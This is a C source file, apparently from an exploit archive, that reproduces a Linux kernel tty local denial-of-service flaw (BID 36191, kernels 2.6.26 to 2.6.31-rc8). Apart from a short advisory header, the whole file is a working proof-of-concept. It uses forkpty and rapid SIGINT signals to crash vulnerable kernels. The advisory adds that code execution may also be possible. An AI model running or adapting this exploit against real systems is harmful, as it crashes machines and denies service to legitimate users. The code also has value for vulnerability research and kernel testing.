/*
source: http://www.securityfocus.com/bid/36191/info

The Linux kernel is prone to a local denial-of-service vulnerability.

Attackers can exploit this issue to crash the affected kernel, denying service to legitimate users. Given the nature of this issue, attackers may also be able to execute arbitrary code, but this has not been confirmed.

This issue was introduced in Linux kernel 2.6.26 and fixed in 2.6.31-rc8. 
*/


/* gcc -o KernelTtyTest KernelTtyTest.c -Wall -O2 -lutil */
#define _GNU_SOURCE 1
#include <stdio.h>
#include <pty.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <signal.h>
#include <poll.h>
#include <setjmp.h>
#include <ctype.h>
#define POLL_TIMEOUT (10*1000)  /* in milliseconds */
#define LASTBUFSZ  10000
#define CMDBUFSZ 10000
#define SIGINT_LONGJMP 0
#define SIGINT_VAR 1
static void putstr(char *str, FILE *out)
{
	int c;
	for (c = *str++; c; c = *str++) {
		if (iscntrl(c)) {
			putc('\\', out);
			switch(c) {
			case '\n':  putc('n', out); break;
			case '\r':  putc('r', out); break;
			default: printf("%03o", c); break;
			}
		} else {
			putc(c, out);
		}
	}
}
static void print_lastbytes(char *lastbytes, size_t totalbytes, FILE *out)
{
	char *start = lastbytes;
	if (totalbytes < LASTBUFSZ)
		start = &lastbytes[LASTBUFSZ - totalbytes];
	fprintf(out, "lastbytes: '");
	putstr(start, out);
	fprintf(out, "'");
}
static void expect(int masterfd, char *str, size_t len)
{
	char lastbytes[LASTBUFSZ + 1];
	size_t totalbytes = 0;
	memset(lastbytes, sizeof(lastbytes), 0);

	for (;;) {
	  	char buf[1];
		ssize_t bytes;
		int ret;
		struct pollfd fds = {
			.fd = masterfd,
			.events = POLLIN | POLLERR | POLLHUP,
			.revents = 0,
		};
		ret = poll(&fds, 1, POLL_TIMEOUT);
		if (ret == 0) {
			fprintf(stderr, "Timeout while waiting for '");
			putstr(str, stderr);
			fprintf(stderr, "' ");
			print_lastbytes(lastbytes, totalbytes, stderr);
			fprintf(stderr,"\n");
			exit(5);
		}
		else if (ret < 0) {
			fprintf(stderr, "poll failed: %s\n", strerror(errno));
			exit(4);
		}
		bytes = read(masterfd, buf, 1);
		if (bytes == 1) {
			totalbytes++;
			memmove(lastbytes, lastbytes +1, LASTBUFSZ);
			lastbytes[LASTBUFSZ - 1] = buf[0];
			lastbytes[LASTBUFSZ] = '\0';
			if (memcmp(&lastbytes[LASTBUFSZ - len], str, len) == 0)
				return;
		}
		else if (bytes < 0) {
			fprintf(stderr, "read failed: %s\n",
				strerror(errno));
			print_lastbytes(lastbytes, totalbytes, stderr);
			fprintf(stderr,"\n");
			abort();
			exit(3);
		}
	}
}
static void resync(int masterfd)
{
	static unsigned count;
	char cookie[100];
	char cmd[1000];
	char reply[1000];
	ssize_t written, bytes;
	snprintf(cookie, sizeof(cookie), "_%u_", ++count);
	bytes = snprintf(cmd, sizeof(cmd), "echo %s\n", cookie);
	written = 0;
	while (bytes) {
		ssize_t sent;
		sent = write(masterfd, cmd + written, bytes);
		if (sent >= 0) {
			written += sent;
			bytes -= sent;
		} else if ((errno != EAGAIN) && (errno != EINTR)) {
			fprintf(stderr, "Write to child failed: %s\n", strerror(errno));
			exit(2);  
		}
	}
	snprintf(reply, sizeof(reply), "\n%s", cookie);
	expect(masterfd, reply, strlen(reply));
}
#if SIGINT_VAR
static volatile sig_atomic_t saw_sigint;
#endif

static void process_cmd(void)
{
	char cmdbuf[CMDBUFSZ];
	size_t cmdlen;
	char buf[1];
	cmdlen = 0;
	for (;;) {
		ssize_t bytes;
#if SIGINT_VAR
		if (saw_sigint) {
			saw_sigint = 0;
			printf("^C\n");
			fflush(stdout);
			return;
		}
#endif
		bytes = read(STDIN_FILENO, buf, 1);
		if (bytes == 1) {
			cmdbuf[cmdlen] = '\0';
			putchar(buf[0]);
			fflush(stdout);
			if (buf[0] == '\n') {
				if (cmdlen == 0) {
					printf("> ");
					fflush(stdout);
				}
				else if (memcmp("echo ", cmdbuf, 5) == 0) {
				  	printf("%s\n", cmdbuf + 5);
					fflush(stdout);
					return;
				} else {
					fprintf(stdout, "unknown cmd: '");
					putstr(cmdbuf, stdout);
					printf("'\n");
					fflush(stdout);
					return;
				}
			}
			cmdlen += 1;
			if (cmdlen >= CMDBUFSZ) {
				fprintf(stderr, "command too long!\n");
				_exit(3);
			}
			cmdbuf[cmdlen - 1] = buf[0];
			cmdbuf[cmdlen] = '\0';
		}
		if (bytes == 0) {
			/* EOF terminate */
			_exit(0);
		}
		if (bytes < 0) {
			fprintf(stderr, "%s read failed: %s\n",
				__func__, strerror(errno));
			_exit(4);
		}
	}
}
#if SIGINT_LONGJMP
static sigjmp_buf sigint_dest;
#endif
static void sigint_handler(int signum)
{
#if SIGINT_LONGJMP
	siglongjmp(sigint_dest, 1);
#endif
#if SIGINT_VAR
	saw_sigint = 1;
#endif
}
static void process_cmds(void)
{
	sigset_t signal_set;
#if 1
	struct sigaction act;
#endif
	sigemptyset( &signal_set);
	sigaddset( &signal_set, SIGINT);

	/* Block sigint until I reinstall the handler */
	sigprocmask(SIG_BLOCK, &signal_set, NULL);
#if 0
	signal(SIGINT, sigint_handler);
#else
	memset(&act, sizeof(act), 0);
	act.sa_handler = &sigint_handler;
	act.sa_flags = SA_NODEFER;
	sigaction(SIGINT, &act, NULL);
#endif
#if SIGINT_LONGJMP
	if (sigsetjmp(sigint_dest, 1)) {
		printf("^C\n");
		fflush(stdout);
	}
#endif
	sigprocmask(SIG_UNBLOCK, &signal_set, NULL);
	for (;;)
		process_cmd();
}
int main(int argc, char *argv[], char *environ[])
{
	pid_t pid;
	int masterfd;
	struct winsize terminal_size;
	int i;
	terminal_size.ws_row = 80;
	terminal_size.ws_col = 25;
	terminal_size.ws_xpixel = 0;
	terminal_size.ws_ypixel = 0;

	pid = forkpty(&masterfd, NULL, NULL, &terminal_size);
	if (pid == 0) { /* child */
		char *args[] = {  "/bin/sh",  NULL };
		char *env[] = { NULL };
#if 0
		execve("/bin/bash", args, env);
#endif
#if 1
		process_cmds();
#endif
		_exit(1);
	}
	resync(masterfd);
#if 1
	for (i = 0; i < 10; i++) {
		usleep(100);
		kill(pid, SIGINT);
	}
#endif
#if 0
	usleep(1000);
#endif
	resync(masterfd);
	return 0;
}